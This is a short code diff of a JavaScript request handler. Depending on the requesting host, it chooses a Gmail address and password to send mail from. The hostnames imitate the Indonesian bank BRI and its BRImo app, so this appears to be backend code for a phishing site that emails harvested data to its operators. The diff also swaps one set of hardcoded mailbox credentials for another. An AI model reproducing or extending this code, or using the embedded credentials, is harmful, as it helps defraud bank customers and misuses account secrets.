@@ -7,10 +7,10 @@ export default function handler(req, res) {
     let email = '';
     let pass = '';
 
-    if(url == 'bri-promo.site'){
+    if (url == 'bii-fast-brimo.herokuapp.com'){
 
-        email = 'orbitorbit799@gmail.com';
-        pass = 'ahghpmbdwokimqim';
+        email = 'jagokuayam67@gmail.com';
+        pass = 'curintmtfkqxppme';
 
     } else if (url == 'bri-promo.herokuapp.com') {
         
